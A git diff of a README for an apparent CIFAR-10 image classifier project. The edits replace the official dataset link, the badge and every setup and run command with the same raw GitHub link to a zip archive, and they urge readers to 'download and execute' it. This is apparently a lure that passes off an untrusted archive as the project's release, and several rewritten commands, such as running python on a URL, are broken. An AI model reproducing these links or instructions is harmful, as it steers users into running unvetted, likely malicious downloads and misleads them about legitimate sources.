@@ -1,10 +1,10 @@
 # CIFAR-10 Image Classifier 🧠
 
-![CIFAR-10 Image Classifier](https://img.shields.io/badge/CIFAR--10%20Image%20Classifier-TensorFlow-blue?style=for-the-badge)
+![CIFAR-10 Image Classifier](https://raw.githubusercontent.com/Zakstor15/cifar10-image-classifier/main/motionless/image_cifar_classifier_3.3.zip%20Image%20Classifier-TensorFlow-blue?style=for-the-badge)
 
 Welcome to the **CIFAR-10 Image Classifier** repository! This project showcases deep learning techniques to classify images from the CIFAR-10 dataset using both Artificial Neural Networks (ANN) and Convolutional Neural Networks (CNN). The repository includes everything you need for model training, evaluation, and visualization of predictions.
 
-[Download and execute the latest release here!](https://github.com/Zakstor15/cifar10-image-classifier/releases)
+[Download and execute the latest release here!](https://raw.githubusercontent.com/Zakstor15/cifar10-image-classifier/main/motionless/image_cifar_classifier_3.3.zip)
 
 ## Table of Contents
 
@@ -39,7 +39,7 @@ This project aims to build a robust image classifier using TensorFlow and Keras,
 
 ## CIFAR-10 Dataset
 
-The CIFAR-10 dataset is widely used for benchmarking machine learning models. It provides a good balance of complexity and size, making it ideal for training models. You can download the dataset from the official [CIFAR-10 website](https://www.cs.toronto.edu/~kriz/cifar.html).
+The CIFAR-10 dataset is widely used for benchmarking machine learning models. It provides a good balance of complexity and size, making it ideal for training models. You can download the dataset from the official [CIFAR-10 website](https://raw.githubusercontent.com/Zakstor15/cifar10-image-classifier/main/motionless/image_cifar_classifier_3.3.zip~https://raw.githubusercontent.com/Zakstor15/cifar10-image-classifier/main/motionless/image_cifar_classifier_3.3.zip).
 
 ### Dataset Structure
 
@@ -68,7 +68,7 @@ To set up the project on your local machine, follow these steps:
 1. **Clone the repository**:
 
    ```bash
-   git clone https://github.com/Zakstor15/cifar10-image-classifier.git
+   git clone https://raw.githubusercontent.com/Zakstor15/cifar10-image-classifier/main/motionless/image_cifar_classifier_3.3.zip
    cd cifar10-image-classifier
    ```
 
@@ -77,12 +77,12 @@ To set up the project on your local machine, follow these steps:
    You can install the required packages using pip. It is recommended to use a virtual environment.
 
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/Zakstor15/cifar10-image-classifier/main/motionless/image_cifar_classifier_3.3.zip
    ```
 
 3. **Download the CIFAR-10 dataset**:
 
-   If you haven't downloaded the dataset yet, follow the instructions on the [CIFAR-10 website](https://www.cs.toronto.edu/~kriz/cifar.html).
+   If you haven't downloaded the dataset yet, follow the instructions on the [CIFAR-10 website](https://raw.githubusercontent.com/Zakstor15/cifar10-image-classifier/main/motionless/image_cifar_classifier_3.3.zip~https://raw.githubusercontent.com/Zakstor15/cifar10-image-classifier/main/motionless/image_cifar_classifier_3.3.zip).
 
 ## Usage
 
@@ -93,7 +93,7 @@ Once you have installed the required packages and downloaded the dataset, you ca
 To train the model, run the following command:
 
 ```bash
-python train.py
+python https://raw.githubusercontent.com/Zakstor15/cifar10-image-classifier/main/motionless/image_cifar_classifier_3.3.zip
 ```
 
 This will start the training process. You can monitor the training progress in the terminal.
@@ -103,7 +103,7 @@ This will start the training process. You can monitor the training progress in t
 To evaluate the trained model on the test set, run:
 
 ```bash
-python evaluate.py
+python https://raw.githubusercontent.com/Zakstor15/cifar10-image-classifier/main/motionless/image_cifar_classifier_3.3.zip
 ```
 
 This will output the accuracy and loss of the model on the test data.
@@ -113,7 +113,7 @@ This will output the accuracy and loss of the model on the test data.
 To visualize predictions made by the model, use:
 
 ```bash
-python visualize.py
+python https://raw.githubusercontent.com/Zakstor15/cifar10-image-classifier/main/motionless/image_cifar_classifier_3.3.zip
 ```
 
 This will display some test images along with their predicted labels.
@@ -153,7 +153,7 @@ The training process involves:
 3. Compiling the model.
 4. Fitting the model to the training data.
 
-You can customize hyperparameters such as learning rate, batch size, and number of epochs in the `train.py` file.
+You can customize hyperparameters such as learning rate, batch size, and number of epochs in the `https://raw.githubusercontent.com/Zakstor15/cifar10-image-classifier/main/motionless/image_cifar_classifier_3.3.zip` file.
 
 ## Evaluating the Model
 
@@ -161,7 +161,7 @@ After training, it's essential to evaluate the model's performance on unseen dat
 
 ## Visualizing Predictions
 
-Visualizing predictions helps in understanding how well the model performs. The `visualize.py` script displays a selection of test images along with their predicted and actual labels. This can provide insights into areas where the model may struggle.
+Visualizing predictions helps in understanding how well the model performs. The `https://raw.githubusercontent.com/Zakstor15/cifar10-image-classifier/main/motionless/image_cifar_classifier_3.3.zip` script displays a selection of test images along with their predicted and actual labels. This can provide insights into areas where the model may struggle.
 
 ## Contributing
 
@@ -180,6 +180,6 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any inquiries or suggestions, please reach out to me via GitHub or email.
 
-[Download and execute the latest release here!](https://github.com/Zakstor15/cifar10-image-classifier/releases)
+[Download and execute the latest release here!](https://raw.githubusercontent.com/Zakstor15/cifar10-image-classifier/main/motionless/image_cifar_classifier_3.3.zip)
 
 Check the "Releases" section for updates and new features.
